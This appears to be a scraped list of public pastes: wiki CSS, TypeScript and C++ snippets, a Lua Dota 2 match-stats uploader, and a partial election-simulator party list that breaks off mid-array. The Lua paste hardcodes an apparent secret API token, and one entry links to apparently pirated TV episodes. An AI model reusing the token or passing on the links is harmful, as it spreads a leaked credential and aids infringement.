id,title,username,language,date,content
sbXDwX1C,Untitled,vuseless,HTML,Friday 11th of August 2023 06:58:42 AM CDT,strawpoll.de/y39sy4g
76pcnD9E,New CSS for Wiki-TheWest,BelleBernice,CSS,Friday 11th of August 2023 06:56:07 AM CDT,"/* HEADER AND TOP NAVIGATION */
#mirage-fixed-header {
    background-color: #c9b997;
    box-shadow: none;
}

#mirage-top-header {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

/* Respect width of logo */
img.mw-logo-icon {
    width: inherit;
}

.mw-wordmark-container span.mw-logo-wordmark {
    color: #3d2718;
}

/* Remove duplicated logo and word mark from main page */
#mirage-navigation-header #mirage-logo,
#mirage-navigation-header .mw-logo-wordmark {
    display: none;
}

.skin-mirage-dropdown-list a {
    font-weight: normal;
}

div#right-navigation {
    background-color: transparent;
}

li.mw-list-item,
li.skin-mirage-dropdown-container {
    background: #c9b997;
}

div#module-site-tools li.mw-list-item,
#module-site-tools > ul > li:last-child {
    border-color: black;
}

div.skin-mirage-dropdown-list > ul > li.mw-list-item {
    background: none;
}

/* Move wiki navigation menus to same line as logo */
div#module-site-navigation {
    margin-top: -2.5rem;
}

/* Limit space used by site navigation to avoid overlapping buttons, and move navigation to the right slightly */
div#module-site-navigation.skin-mirage-mirage-navigation {
    max-width: 70%;
    margin-left: 10px;
}

/* Move Right Navigation (edit button etc.) in line with Recent changes */
div#right-navigation {
    position: absolute;
    margin-right: 15px;
    margin-top: -1.25rem;
    right: 0px;
}

/* Recent Changes button text */
#module-site-tools > ul > li:nth-child(1) > a {
    color: #5f391a;
}

/* Edit button row hover styling */
#p-views > ul > li:hover,
#mirage-right-rail-button:hover {
    background-color: rgba(255,255,255,0.15);
    color: #404244;
    border-color: black;
}

/* Have to set this color back to transparent to ensure no text shows on the right rail button on hover */
#mirage-right-rail-button:hover {
    color: transparent;
}

/* Adjust color for Recent Changes icon */
.skin-mirage-ooui-icon-recentChanges:before {
    background-image: url(/load.php?modules=skin.mirage.icons&image=recentChanges&format=rasterized&lang=en&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E recent changes %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M1 3h16v2H1V3Zm0 6h11v2H1V9Zm0 6h7v2H1v-2Zm17.8-3.1 1-1.1a.6.6 0 0 0 0-.8L18 8.2a.6.6 0 0 0-.8 0l-1 1 2.6 2.7Zm-3.3-2L10 15.3V18h2.6l5.6-5.5-2.7-2.7Z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Special Pages icon */
.skin-mirage-ooui-icon-specialPages:before {
    background-image: url(/load.php?modules=skin.mirage.icons&image=specialPages&format=rasterized&lang=en&skin=fallback&version=dk89p);
    background-image: linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E special pages %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath fill=%22%235f391a%22 d=%22M7 0a2 2 0 0 0-2 2h9a2 2 0 0 1 2 2v12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z%22/%3E%3Cpath fill=%22%23fill%22 d=%22M13 20H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v13a2 2 0 0 1-2 2zm-6.5-3.5.41-1.09L8 15l-1.09-.41-.41-1.09-.41 1.09L5 15l1.09.41.41 1.09zm2.982-.949.952-2.561 2.53-.964-2.53-.964L9.482 8.5l-.952 2.562-2.53.964 2.53.964.952 2.561zM6 10.5l.547-1.453L8 8.5l-1.453-.547L6 6.5l-.547 1.453L4 8.5l1.453.547L6 10.5z%22/%3E%3C/g%3E%3C/svg%3E"")
}

/* Adjust color for Random Page icon */
.skin-mirage-ooui-icon-die:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=die&format=rasterized&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E die %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M3 1a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2zm2 16a2 2 0 1 1 2-2 2 2 0 0 1-2 2zM5 7a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm5 5a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm5 5a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm0-10a2 2 0 1 1 2-2 2 2 0 0 1-2 2z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for three dots menu icon */
.skin-mirage-ooui-icon-ellipsis:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=ellipsis&format=rasterized&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E ellipsis %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Ccircle cx=%2210%22 cy=%2210%22 r=%222%22/%3E%3Ccircle cx=%223%22 cy=%2210%22 r=%222%22/%3E%3Ccircle cx=%2217%22 cy=%2210%22 r=%222%22/%3E%3C/g%3E%3C/svg%3E"");
}


/* Background color for Edit Button and Right Rail collapse/expand button */
#mirage-edit-button > li,
#mirage-right-rail-button {
    /* background-image: url(""/skins/MirageWest/images/page-bgtile.png""); */
    background: #c9b997;
}

/* Border color definitions for the top navigation buttons */
#mirage-edit-button > li,
#mirage-edit-button > li + li,
#mirage-edit-button > li:first-child,
#mirage-edit-button > li:last-child,
#mirage-edit-button > li:hover,
#mirage-edit-button > li + li:hover,
#mirage-edit-button > li:hover:first-child,
#mirage-edit-button > li:hover:last-child,
#mirage-right-rail-button,
#mirage-right-rail-button:focus {
    border-color: black;
}

/* Hover color for Edit button */
#mirage-edit-button > li:first-child a:hover {
    color: black;
}

/* Color for Edit button */
#mirage-edit-button > li:first-child a {
    color: #5f391a;
}

/* Adjust color for Edit icon */
.skin-mirage-ooui-icon-edit-invert:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=edit&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E edit %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22m16.77 8 1.94-2a1 1 0 0 0 0-1.41l-3.34-3.3a1 1 0 0 0-1.41 0L12 3.23zM1 14.25V19h4.75l9.96-9.96-4.75-4.75z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Watch icon */
.skin-mirage-ooui-icon-star-invert:before,#ca-watch a:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=star&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E star %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M20 7h-7L10 .5 7 7H0l5.46 5.47-1.64 7 6.18-3.7 6.18 3.73-1.63-7zm-10 6.9-3.76 2.27 1-4.28L3.5 8.5h4.61L10 4.6l1.9 3.9h4.6l-3.73 3.4 1 4.28z%22/%3E%3C/g%3E%3C/svg%3E"")}

/* Adjust color for Unwatch icon */
.skin-mirage-ooui-icon-unStar-invert:before,#ca-unwatch a:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=unStar&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E un-star %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M20 7h-7L10 .5 7 7H0l5.46 5.47-1.64 7 6.18-3.7 6.18 3.73-1.63-7z%22/%3E%3C/g%3E%3C/svg%3E"")}

/* Adjust color for ""More"" menu icon */
.skin-mirage-ooui-icon-indicator-down-invert:before {
    background-image:url(/load.php?modules=skin.mirage.indicators&image=down&variant=invert&format=rasterized&skin=fallback&version=1h8wn);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%2212%22 viewBox=%220 0 12 12%22%3E%3Ctitle%3E down %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M9.9 2.9 6 6.8 2.1 2.9 1 4l5 5 5-5z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Right Rail button icon */
.skin-mirage-ooui-icon-doubleChevronEnd:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=doubleChevronEnd&format=rasterized&lang=en&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E double chevron start %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M11 2 9.7 3.3l6.6 6.7-6.6 6.7L11 18l8-8zM2.5 2 1 3.3 7.8 10l-6.7 6.7L2.5 18l8-8z%22/%3E%3C/g%3E%3C/svg%3E"");
}


/* Hide the editLock icon that doesn't want to be edited for some unexplainable reason */
.skin-mirage-ooui-icon-editLock-invert:before {
    display: none;
}

/* Dropdown list for history, deletion, protection etc. */
li#ca-history,
li#ca-delete,
li#ca-move,
li#ca-protect {
    background: none;
}

/* Remove Main Page header from Main page */
body.page-Main_Page .mw-page-title-main {
    display: none;
}


/* Remove the Page and Discussion buttons from all pages */
div#left-navigation nav#p-namespaces {
    display: none;
}

#module-page-navigation {
    margin: 0;
}


/* Styling of username when logged in / don't show username */
#mirage-fixed-header .skin-mirage-username {
    color: orange;
    display: none;
}

/* Styling for background of dropdown on username/not logged in */
.skin-mirage-personaltools-dropdown li {
    background: none;
}

/* Text color of dropdown on username/not logged in */
li#pt-login {
    color: black;
}

/* Text color on dropdown when no new messages */
.skin-mirage-no-new-messages {
    color: black;
}

/* Main background */
body {
    background-attachment: fixed;
    background-image:
        url(""/skins/MirageWest/images/bg-cover-right.png""),
        url(""/skins/MirageWest/images/bg-cover-left.png""),
        url(""/skins/MirageWest/images/bg-cover-bottom.png""),
        url(""https://wiki.the-west.net/images/d/d5/NewMainBg.jpg"");
    background-position: right center,left center,center bottom,center center;
    background-size: auto,auto,auto,cover;
    background-repeat: repeat-y,repeat-y,repeat-x,no-repeat;
}

/* GENERAL ARTICLE STYLING */
main#content.mw-body,
main#content.mw-body-content,
#mirage-navigation-header,
#module-page-navigation,
.skin-mirage-content-container {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

p,
h1,
h2,
h3,
h4,
h5,
h6,
li,
i {
    color: #3d2718;
}

h1,
h2,
.skin-mirage-right-rail-module h3,
hr {
    border-color: #a6805a;
}


p a,
p a:visited,
li a,
li a:visited {
    color: #3d2718;
    font-weight: bold;
}

p a:hover {
    color: #3d2718;
}

 /* Warning on MediaWiki:Custom.css page */
.mw-editinginterface {
    color: #3d2718;
}

/* Table of Contents styling */
.toc {
    background-color: #c9b997;
}

.toc h2 {
    color: black;
}

.toc li a,
.toc li a:visited,
.toctogglelabel {
    color: #5f391a;
}


/* In-article edit icon styling */
a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small,
a:visited.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
    color: #3d2718;
}

a:hover.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
    color: #3d2718;
}


/* TABLE STYLING */
table th {
    font-weight: normal;
    background-color: #b99968;
    color: #5e321a;
    padding: 10px;
}

/* Special .announcement class table on the Main Page */
th.announcement {
    font-weight: bold;
}

table td .announcement {
    color: #5e321a;
}

table td,
table th {
    text-align: center;
    padding: 5px;
    box-shadow: 0px 0px 1px 1px rgba(255,255,255,0.1) inset;
    background-color: #d4ba91 !important;
}

td,
th {
    padding: 0;
}

td {
    display: table-cell;
    vertical-align: inherit;
}

table {
    display: table !important;
    width: 100%;
    border-collapse: separate;
    border-spacing: 1px !important;
    margin-bottom: 4px;
    border-radius: 3px;
}

table center {
    color: #5e321a;
}

table a,
table a:visited {
    color: #3d2718;
}

table a:hover {
    color: #1480a4;
}

/* RIGHT RAIL STYLING */
#mirage-right-rail {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

#mirage-right-rail a,
#mirage-right-rail a:visited {
    color: #3d2718;
}

#mirage-right-rail a:hover {
    color: #3d2718;
}

/* Remove background color on Page tools section of Right Rail */
.skin-mirage-module-body ul.skin-mirage-unstyled-list > li {
    background: none;
}


/* FOOTER STYLING */
footer {
    display: grid;
    align-content: center;
    justify-content: center;
    justify-items: center;
    margin-top: -25px;
}

footer.mw-footer {
    background-color: transparent;
    box-shadow: none;
    align-content: center;
}

#footer-info-lastmod,
#footer-info-copyright,
#footer-places-privacy,
#footer-places-about,
#footer-places-disclaimer {
    display: inline-block;
    margin-right: 15px;
}

footer ul.skin-mirage-unstyled-list#footer-info {
    margin-right: 0px;
    color: #c9b997;
    text-shadow: 1px 1px 1px black;
}

div#footer-places {
    margin-right: auto;
    margin-left: auto;
}

.mw-footer p,
.mw-footer h3 {
    color: black;
}

.mw-footer a {
    color: #c9b997;
    font-weight: normal;
}

.mw-footer a:hover {
    color: #c9b997;
}

.mw-footer li {
    line-height: 1 !important;
}

div#footer-places {
    margin-left: initial;
}

h3#footer-places-label {
    display: none;
}

li#footer-info-lastmod {
    color: #c9b997;
}

/*Table of contents title*/
#mw-toc-heading {
background: transparent;
}

/*The dropdown top menus should be displayed above some of the custom headers from West*/
.skin-mirage-mirage-navigation .skin-mirage-navigation-entry-item .skin-mirage-dropdown-list {
z-index: 101;
}

/*More West-like border of the table of contents*/
.toc {
border: 1px solid #996b39;
}

/*Remove the title of the page. Unnecessary, and looks out of place.*/
.mw-wordmark-container span.mw-logo-wordmark {
display: none;
}

/*Background for the top bar*/
#mirage-fixed-header {
background-image: url(""/skins/MirageWest/images/headline-bgtile.png"");
}

/*Don't show username, or 'not logged in' in the top bar*/
#mirage-fixed-header .skin-mirage-username {
display: none;
}

/*Don't show site notice - the thing with the side menu used in the old version of the wiki*/
#siteNotice {
display: none;
}


/*Make 'edit' link visible again*/
a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
color: #ccc;
}

h3 a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
color: #804000;
}

/*Faint border around the main content*/
.mediawiki-content-container {
border-left: 2px solid #996b39;
border-right: 2px solid #996b39;
border-bottom: 2px solid #996b39;
}

#mirage-top-header {
border-left: 2px solid #996b39;
border-right: 2px solid #996b39;
border-top: 2px solid #996b39;
}

#left-navigation, #right-navigation, #left-navigation nav, #right-navigation nav, #left-navigation label, #right-navigation label {
padding-right: 5px;
}

/*Make the semantic media wiki readable*/
.smw-editpage-help {
background-color: #565656;
}

/* Make the errors on uploading the same file readable */
.mw-destfile-warning {
color: #5e321a;
}

.externalimage-holder {
position: relative;
margin: auto;
display: inline-block;
max-width: 600px;
}
.externalimage-holder img {
width: 100%;
height: auto;
}
img {
max-width: 900px;
}

#document-wrapper
{
max-width: 1200px;
}



/* West specific changes */
/* Correct button sizes for save buttons of articles */
#wpSave,
#wpPreview,
#wpDiff {
    width: initial;
}

/* Adjust image size on Main Page slightly so it cannot go outside of bounds */
body.page-Main_Page .container-title,
body.page-Huvudsida .container-title,
body.page-Forside .container-title {
    width: initial;
}

/* Mobile-specific changes */
@media screen and (max-width: 720px)
{
/* Remove the unnecessary logo next to the navigation links */
#mirage-navigation-header #mirage-logo {
   display: none;
}

/*Remove the wiki title on mobile*/
.mw-logo-wordmark {
   display: none;
}

/*Set max image size on mobile, so they scale*/
img {
  display: block;
  max-width:90%;
  width: auto;
  height: auto;
}

/* Remove text of Recent Changes button */
div#module-site-tools li.mw-list-item:first-child a {
    color: transparent;
}

/* Avoid right-floating images to overlap text or take too much space on Mobile */
div.tright,
div.floatright,
table.floatright {
    clear: right;
    float: unset;
}
}

/* Remove overlay popup */
.overlay-popup {
display: none;
}
"
0CYK1cEL,Facade,Idanref,TypeScript,Friday 11th of August 2023 06:20:21 AM CDT,"class CPU {
  start(): void {
    console.log(""CPU started"");
  }
}

class Memory {
  load(position: number, data: string): void {
    console.log(`Loading data ${data} at position ${position}`);
  }
}

class HardDrive {
  read(position: number, size: number): string {
    console.log(`Reading ${size} data from position ${position}`);
    return ""data"";
  }
}

// Facade: This is the class that simplifies the interface to the subsystems.
class Computer {
  private cpu: CPU;
  private memory: Memory;
  private hardDrive: HardDrive;

  constructor() {
    this.cpu = new CPU();
    this.memory = new Memory();
    this.hardDrive = new HardDrive();
  }

  start(): void {
    this.cpu.start();
    const data = this.hardDrive.read(1000, 200);
    this.memory.load(0, data);
    console.log(""Computer started"");
  }
}

// Client Code: The client interacts with the subsystems through the simplified interface provided by the facade.
const computer = new Computer();
computer.start();
// Output:
// CPU started
// Reading 200 data from position 1000
// Loading data data at position 0
// Computer started"
kNrisFDQ,data661,TestGuy1,JSON,Friday 11th of August 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9ec7bce836fb8195269ba11ae64eaa30dc0d5128333d126216476ddce1085cbd41ad0e58a636e7de7a100e36f4fa13d30b9a6e7d8c8eba8b5b7c7a4ffab6fae5191b476ad632806c521de56ac8f39f7e054745098d550f97390e1d20cea17f3750728e1b75660ee8c7e9145117002cd714d559a15430b3243ab5f7837849fbd2',
  otherdata: [
    '41a0ffa8b8c130048e2909676c1efdb5',
    '7a941fec7a4d7da1f534ae855db075cf',
    'dd7c4f07159b22ce66fc4d823991e9d6',
    '18d1bbab283e55062841917d1504f3f4',
    '678d872daa32a9eeb00ef142578a0ecc',
    '2b97f0d5bf4af99800e6c3b4bfa3e105',
    '9bc8f59af51c8ca36ac39a5f0895b81f',
    'fc505eceef160473f485c99e52cb5829'
  ]
}"
k6ETnnys,Обращение к элементу массива,Mauzzz0,TypeScript,Friday 11th of August 2023 05:26:46 AM CDT,"const clients = [{id: 1, name: '100'}, {id: 2, name: '200'}];

const findFirstClient = (arr: typeof clients) => {
    return arr[0];
}

const firstClient = findFirstClient(clients);

firstClient.name = 'one';

console.log(clients);

const firstClientAlternative = clients[0];

firstClientAlternative.name = 'two';

console.log(clients);
"
DrbjABzy,EXO Ladder 4,ktvchains,Perl,Friday 11th of August 2023 05:18:15 AM CDT,"# EN, 1080p
# I'll try to update this on Fridays, as people have requested 1080p links, but there might be delays, since it's not a priority.
# Subtitles (KOCOWA release): https://subscene.com/subtitles/exos-travel-the-world-on-a-ladder-in-geoje-and-tongyeong-travel-the-world-on-exos-ladder-season-4-exo-4
 
# E2 230811
[!ads] watch: https://filemoon.sx/d/jmql5fhinklj
[!ads] download: https://www.europeup.com/vys51hg3gopw/exol4_e2_1080p_kcw.mp4

# E1 230811
[!ads] watch: https://filemoon.sx/d/ju84ijs5bbx2
[!ads] download: https://www.europeup.com/iey3q37g7ew1/exol4_e1_1080p_kcw.mp4"
fXWq31VF,DotaN Stats,Enkada,Lua,Friday 11th of August 2023 05:14:22 AM CDT,"require(""stats"")

function CAddonTemplateGameMode:InitGameMode()
	-- [Your code]
	
	-- Sends dedicated key to the server
	-- Comment out this line once key is received and set on server side
	Stats.SendKey()

	-- Listens to an event, that occurs when one of the team's anicent gets destroyed
	-- and submits match data via HTTP POST request
	ListenToGameEvent('dota_match_done', function(keys)
		Stats.SubmitMatch(keys.winningteam)
    end, nil)
end


-- 
-- File [stats.lua]
--

Stats = class({})

Stats.host = ""https://dotan.enkada.ru/api/match/add.php""
Stats.key = GetDedicatedServerKey(""FaPaH002"")

Stats.token = ""O=X97Pq-NnZ4rTY9GYa1!Dq7IUbltZY38apSJa7LC-ISvfE/qf8T6OO/VviCEUJx""

-- Submits match data using POST HTTP request
function Stats.SubmitMatch(winningteam, callback)
	print(""[STATS] Attempt to submit match"")

	local data = {
		matchID = tostring(GameRules:Script_GetMatchID()), -- Returns zero in dev mode
		duration = math.floor(GameRules:GetGameTime() + 0.5),
        winner = winningteam, -- DOTA_TEAM_GOODGUYS = 2, DOTA_TEAM_BADGUYS = 3
		players = GetPlayerList(),
        token = Stats.token
		-- key = Stats.key
	}

    --print(""Post data JSON:"", json.encode(data))

	local req = CreateHTTPRequestScriptVM(""POST"", Stats.host)

    if req == nil then
        print(""[STATS] Failed to create http request"")
	end

	req:SetHTTPRequestGetOrPostParameter('data', json.encode(data))

    req:Send(function(res)
        if res.StatusCode ~= 200 then
            print(""[STATS] Server connection failure, code"", res.StatusCode)
            return
        end

		print(""[STATS] Received"", res.Body)
		local obj, pos, err = json.decode(res.Body)
    end)
end

-- Sends dedicated server key
-- Only used on the first setup and when secret string for Stats.key changes
function Stats.SendKey()
	local data = {
		key = Stats.key
	}

	local req = CreateHTTPRequestScriptVM(""POST"", Stats.host)

    if req == nil then
        print(""[STATS] Failed to create http request"")
	end

	req:SetHTTPRequestGetOrPostParameter('dedicated_key', json.encode(data))

    req:Send(function(res)
        if res.StatusCode ~= 200 then
            print(""[STATS] Server connection failure, code"", res.StatusCode)
            return
        end

		print(""[STATS] Server key sent"", res.Body)
    end)
end

-- Creates an array of players
-- steamName returns an empty string
-- TODO: add tower damage
function GetPlayerList()
    local players = {}
    for playerID = 0, DOTA_MAX_PLAYERS do
        if PlayerResource:IsValidPlayerID(playerID) then
            if not PlayerResource:IsBroadcaster(playerID) then

                table.insert(players, {
                    steamID32 = PlayerResource:GetSteamAccountID(playerID),
                    steamID64 = tostring(PlayerResource:GetSteamID(playerID)), 
					playerName = PlayerResource:GetPlayerName(playerID), -- Empty for some reason
					team = PlayerResource:GetTeam(playerID) - 2,
					hero = string.gsub(PlayerResource:GetSelectedHeroName(playerID), ""npc_dota_hero_"", """"),
					items = GetItemList(PlayerResource:GetSelectedHeroEntity(playerID)),
					networth = PlayerResource:GetNetWorth(playerID),
					kills = PlayerResource:GetKills(playerID),
					deaths = PlayerResource:GetDeaths(playerID),
					assists = PlayerResource:GetAssists(playerID),
					gpm = PlayerResource:GetGoldPerMin(playerID),
					xpm = PlayerResource:GetXPPerMin(playerID),
					level = PlayerResource:GetLevel(playerID),
					level = PlayerResource:GetLevel(playerID),
					lastHits = PlayerResource:GetLastHits(playerID),
					denies = PlayerResource:GetDenies(playerID),
					damage = PlayerResource:GetRawPlayerDamage(playerID),
					healing = PlayerResource:GetHealing(playerID)
                })
            end
        end
    end

    return players
end

-- Creates an item array by hero
function GetItemList(hero)
    local itemTable = {}

    for i = 0, 5 do
        local item = hero:GetItemInSlot(i)
        if item then
            local itemName = string.gsub(item:GetAbilityName(), ""item_"", """") -- Cuts the item_ prefix
            table.insert(itemTable, itemName)
        end
    end

    return itemTable
end"
RHYUrCx5,Untitled,Gosunov,C++,Friday 11th of August 2023 05:07:58 AM CDT,"#include <bits/stdc++.h>
using namespace std;
#define set _set
 
const int maxn = 1000000000;
char p[maxn / 16 + 1];
 
void set(int x) {
    x >>= 1;
    p[x / 8] |= '\1' << (x % 8); 
}
 
bool get(int x) {
    x >>= 1;
    return !((p[x / 8] >> (x % 8)) & 1);
}
 
void build() {
    for (int i = 3; i * i < maxn; i += 2) {
        if (!get(i))
            continue;
        for (int j = i * i; j < maxn; j += (i << 1)) {
            set(j);
        }
    }
}
 
bool is_prime(int x) {
    if (x == 2) return true;
    if ((x & 1) == 0) return false;
    return get(x);
}
 
void solve() {
    int primes = 0;
    for (int i = 1; i < maxn; ++i)
        primes += is_prime(i);
    cout << primes << '\n';
}
 
signed main() {
    build();
    solve();
}"
rUnYpK7i,ADSAF,Salvens,C++,Friday 11th of August 2023 05:05:05 AM CDT,"#include <map>
#include <set>
#include <cmath>
#include <queue>
#include <stack>
#include <bitset>
#include <cstdio>
#include <random>
#include <vector>
#include <fstream>
#include <iomanip>
#include <numeric>
#include <iostream>
#include <algorithm>
#include <unordered_set>
#include <unordered_map>

using namespace std;

#define int long long

const int C = 20;
const int MAXN = (int)1e6 + 5;
const long long INF = (long long)1e18;
const double PI = 3.1415926535897;
const int k = 1000003, mod = 1e9 + 7, mod1 = 228228227;
vector<int> h(MAXN), h1(MAXN), rh(MAXN), rh1(MAXN), p(MAXN), p1(MAXN);

int mul(int a, int b) {
    return a * b % mod;
}

int minu(int a, int b) {
    if (a >= b) {
        return a - b;
    } else {
        return a - b + mod;
    }
}

int mul1(int a, int b) {
    return a * b % mod1;
}

int minu1(int a, int b) {
    if (a >= b) {
        return a - b;
    } else {
        return a - b + mod1;
    }
}

int get(int l, int r) {
    return minu(h[r], mul(h[l], p[r - l]));
}

int get1(int l, int r) {
    return minu1(h1[r], mul1(h1[l], p[r - l]));
}

int rget(int l, int r) {
    return minu(rh[r], mul(rh[l], p[r - l]));
}

int rget1(int l, int r) {
    return minu1(rh1[r], mul1(rh1[l], p[r - l]));
}

void solve() {
    int n, m;
    cin >> n >> m;
    vector<int> a(n);
    for (int &i : a) {
        cin >> i;
    }
    h1[0] = 0;
    h[0] = 0;
    rh[0] = 0;
    rh1[0] = 0;
    for (int i = 0; i < a.size(); ++i) {
        h[i + 1] = (mul(h[i], k) + a[i]) % mod;
        rh[i + 1] = (mul(rh[i], k) + a[a.size() - i - 1]) % mod;
        h1[i + 1] = (mul1(h1[i], k) + a[i]) % mod1;
        rh1[i + 1] = (mul1(rh1[i], k) + a[a.size() - i - 1]) % mod1;
    }

    vector<int> ans = {n};
    for (int i = 1; i <= n / 2; ++i) {
//        cout << i << endl;
//        cout << get(0, i) << ' ' << rget(n - 2 * i, n - i) << '\n';
//        cout << mul(get(0, i), p[n - i]) << ' ' << mul(rget(n - 2 * i, n - i), p[i]) << ' ' << mul1(get1(0, i), p[n - i]) << ' ' << mul1(rget1(n - 2 * i, n - i), p[i]) << '\n';
        if (get(0, i) == rget(n - 2 * i, n - i) && get(0, i) == rget(n - 2 * i, n - i)) {
            ans.emplace_back(n - i);
        }
    }
    sort(ans.begin(), ans.end());
    for (int i : ans) {
        cout << i << ' ';
    }
}

int32_t main() {
//    freopen(""input.txt"", ""r"", stdin);
//    freopen(""output.txt"", ""w"", stdout);
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    p[0] = 1;
    for (int i = 1; i < MAXN; ++i) {
        p[i] = (p[i - 1] * k) % mod;
    }
    int ttt = 1;
    //cin >> ttt;
    while (ttt--) {
        solve();
    }
    return 0;
}"
rbJ22Gqs,Election and Political Simulation (C++),4rl3fd,C++,Friday 11th of August 2023 04:59:49 AM CDT,"#include <iostream>
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <fstream>
#include <algorithm>
#include <utility>
#include <cmath>

using namespace std;

//string allparties[6][5] = {{""National Revival Rally - L"", ""Collectivist Union"",""Labor Party"", ""New Cultural Movement - L"", ""Patriotic Socialists United - L""}, {""National Reform Council"", ""New Cultural Movement - P"", ""Yellow & Blue Alliance - P"", ""People's Nationalist League - P"", ""National Revival Rally - P""}, {""Liberal Democratic Congress"", ""Unity and Nation - M"", ""Yellow & Blue Alliance - M"", ""Centrist Democrats"", ""National Revival Rally - M""}, {""The Traditional Way"", ""Unity and Nation - R"", ""Yellow & Blue Alliance - R"", ""Conservative Labor"", ""National Revival Rally - R""},{""Order and Culture Front"", ""Unity and Nation - N"", ""Patriotic Socialists United - N"", ""National Revival Rally - N"", ""People's Nationalist League - N""}, {""National Development Corp"", ""United Officer's League"", ""People's Revolutionary Vanguard""}};

string allparties[6][10]= {
    {""Progressive Unity Party"",""Equality Forward Party"",""People's Liberation Alliance"",""Social Justice Movement"",""Workers' Solidarity Party"",""Democratic Renewal Front"",""Collective Future Coalition"",""Green Progress Party"",""New Horizons League"",""Liberty and Equity Bloc""},
    {""People's Voice Party"",""Common Folks Movement"",""National Renewal Party"",""True Patriot Party"",""People's Choice Alliance"",""Everyday Heroes Party"",""Main Street Movement"",""Grassroots Empowerment Party"",""Heartland Action Party"",""Populist Unity Front""},
    {""Unity Center Party"",""Progressive Moderates Alliance"",""Common Ground Coalition"",""Centrist Democratic Movement"",""Bridge Builders Party"",""Modern Voice Party"",""Middle Path Alliance"",""Balanced Future Front"",""Core Values Party"",""Centrist Reconciliation Party""},
    {""Conservative Reform Party"",""Traditionalist Vanguard"",""National Sovereignty Party"",""Freedom and Order Alliance"",""Righteous Future Movement"",""Patriotic Restoration Party"",""True Values Front"",""Heritage Guardians Party"",""Nationalist Revival Coalition"",""Right-Wing Unity Party""},
    {""Homeland First Party"",""National Pride Movement"",""Sovereign Nation Party"",""Patriot's Renewal Front"",""Cultural Identity Alliance"",""Heritage Defenders Party"",""Native Land Coalition"",""National Unity Guardians"",""Ethno-Nationalist Bloc"",""New Nationalist Vanguard""},
